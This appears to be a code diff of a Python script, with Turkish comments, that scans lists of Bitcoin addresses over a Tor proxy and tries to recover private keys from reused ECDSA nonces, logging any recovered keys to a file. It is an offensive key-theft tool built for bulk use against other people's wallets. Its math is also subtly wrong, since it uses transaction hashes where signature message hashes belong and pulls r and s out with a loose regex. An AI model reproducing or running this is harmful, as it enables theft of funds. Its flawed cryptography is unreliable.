@@ -1,117 +1,99 @@
-import time
 import requests
-from sympy import mod_inverse
+import time
+import random
+import re
+from hashlib import sha256
+from binascii import unhexlify
 
-# Sabitler
-SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 prime order
-
-# Private key kurtarma fonksiyonu
-def recover_private_key(r, s1, s2, z1, z2, n):
+def fetch_transactions(address, proxies):
+    """Fetch transactions for a given BTC address."""
+    url = f"https://blockchain.info/rawaddr/{address}"
     try:
-        s_diff = (s1 - s2) % n
-        z_diff = (z1 - z2) % n
-        s_diff_inv = mod_inverse(s_diff, n)
-        private_key = (z_diff * s_diff_inv) % n
-        return private_key
-    except ValueError:
-        print("Modüler ters hesaplaması başarısız oldu!")
+        response = requests.get(url, proxies=proxies, timeout=10)
+        response.raise_for_status()
+        data = response.json()
+        return data.get("txs", [])
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching transactions for {address}: {e}")
         return None
 
-# BlockCypher API'den işlem bilgilerini çekme
-def fetch_transactions(address):
-    url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/full"
-    response = requests.get(url)
-    if response.status_code == 200:
-        return response.json()
-    else:
-        print(f"API Hatası: {response.status_code} - {response.text}")
+def extract_r_s(script_sig):
+    """Extract r and s values from a scriptSig."""
+    matches = re.findall(r'[0-9a-fA-F]{64}', script_sig)
+    if len(matches) >= 2:
+        return matches[0], matches[1]  # r ve s değerleri
+    return None, None
+
+def calculate_private_key(r1, s1, z1, s2, z2):
+    """Calculate private key from r, s1, z1, s2, z2."""
+    try:
+        s_diff = (int(s1, 16) - int(s2, 16)) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+        z_diff = (int(z1, 16) - int(z2, 16)) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+        s_diff_inv = pow(s_diff, -1, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)
+        private_key = (z_diff * s_diff_inv) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+        return hex(private_key)[2:].zfill(64)
+    except Exception as e:
+        print(f"Error calculating private key: {e}")
         return None
 
-# İşlem detaylarından imza bilgilerini çıkarma
-def extract_signature_data(tx):
-    inputs = tx.get("inputs", [])
-    if not inputs:
-        return []
+def process_transactions(transactions, found_file, address):
+    """Process transactions to find r collisions and recover private keys."""
+    if not transactions:
+        print("No transactions to process.")
+        return
 
-    signatures = []
-    for inp in inputs:
-        script = inp.get("script", "")
-        if script and len(script) >= 130:
-            try:
-                r = int(script[:64], 16)
-                s = int(script[64:128], 16)
-                z = int(script[128:192], 16)  # Örnek, hash doğrulama için düzenlenebilir
-                signatures.append({"r": r, "s": s, "z": z})
-            except ValueError:
-                continue
-    return signatures
-
-# Aynı r değerine sahip işlemleri tespit et ve private key kurtar
-def find_and_recover_private_keys(transactions):
-    signature_map = {}
-    private_keys = []
-    addresses_with_keys = []  # Private key bulunan adresler
+    seen_r = {}
 
     for tx in transactions:
-        sigs = extract_signature_data(tx)
-        for sig in sigs:
-            r = sig["r"]
-            if r in signature_map:
-                existing_sig = signature_map[r]
-                # Aynı r değerine sahip imzalar bulundu
-                private_key = recover_private_key(
-                    r,
-                    existing_sig["s"],
-                    sig["s"],
-                    existing_sig["z"],
-                    sig["z"],
-                    SECP256K1_N,
-                )
-                if private_key:
-                    print(f"Aynı nonce (r) tespit edildi! Private Key: {hex(private_key)}")
-                    private_keys.append(private_key)
-                    addresses_with_keys.append(tx['inputs'][0].get('addresses', [''])[0])  # İlgili adresi ekleyin
-            else:
-                # İlk kez görülen r değeri
-                signature_map[r] = sig
+        for input_tx in tx.get("inputs", []):
+            script_sig = input_tx.get("script", "")
+            print(f"Processing script: {script_sig}")
 
-    return private_keys, addresses_with_keys
+            r, s = extract_r_s(script_sig)
+            if r:
+                print(f"Found r: {r}, s: {s}")
 
-# Ana program
+                if r in seen_r:
+                    print("r collision detected! Attempting to calculate private key...")
+                    z1, s1 = seen_r[r]
+                    private_key = calculate_private_key(r, s1, z1, s, tx.get("hash", "0"))
+
+                    if private_key:
+                        print(f"Recovered private key for address {address}: {private_key}")
+                        with open(found_file, "a") as f:
+                            f.write(f"Address: {address}, Private key: {private_key}\n")
+                    else:
+                        print("Failed to recover private key.")
+                else:
+                    seen_r[r] = (tx.get("hash", "0"), s)
+
 def main():
-    with open("v.txt", "r") as file:
-        addresses = file.readlines()
+    # SOCKS5 Proxy ayarları
+    proxies = {
+        "http": "socks5h://127.0.0.1:9050",
+        "https": "socks5h://127.0.0.1:9050",
+    }
 
-    # Her bir adresi sırayla işleme
+    # Rastgele sıralı adres listesi
+    address_file = "g.txt"
+    found_file = "found.txt"
+
+    with open(address_file, "r") as f:
+        addresses = [line.strip() for line in f.readlines()]
+
+    random.shuffle(addresses)  # Adresleri rastgele sıraya koy
+
     for address in addresses:
-        address = address.strip()  # Adreste boşlukları temizle
-        print(f"Adres: {address} için işlem bilgileri çekiliyor...")
-        data = fetch_transactions(address)
+        print(f"Processing address: {address}")
+        transactions = fetch_transactions(address, proxies)
 
-        if not data:
-            print(f"Adres {address} için işlem bulunamadı veya API hatası.")
+        if transactions is None:
+            print("Skipping due to fetch error.")
+            time.sleep(7)  # Ban yememek için bekleme süresi
             continue
 
-        # İşlemleri al
-        transactions = data.get("txs", [])
-        if not transactions:
-            print(f"Adres {address} için işlem geçmişi bulunamadı.")
-            continue
-
-        print(f"{len(transactions)} işlem bulundu. İşlem geçmişi taranıyor...")
-        private_keys, addresses_with_keys = find_and_recover_private_keys(transactions)
-
-        if private_keys:
-            print(f"{len(private_keys)} adet private key kurtarıldı!")
-            with open("found.txt", "a") as found_file:
-                for addr in addresses_with_keys:
-                    found_file.write(f"{addr}\n")  # Private key bulunan Bitcoin adresini yaz
-        else:
-            print(f"Adres {address} için nonce (r) tekrarı bulunamadı.")
-
-        # API banını önlemek için 5 saniye bekleyin
-        print("API banını önlemek için 5 saniye bekleniyor...")
-        time.sleep(10)
+        process_transactions(transactions, found_file, address)
+        time.sleep(7)  # Her adres arasında bekleme süresi
 
 if __name__ == "__main__":
     main()
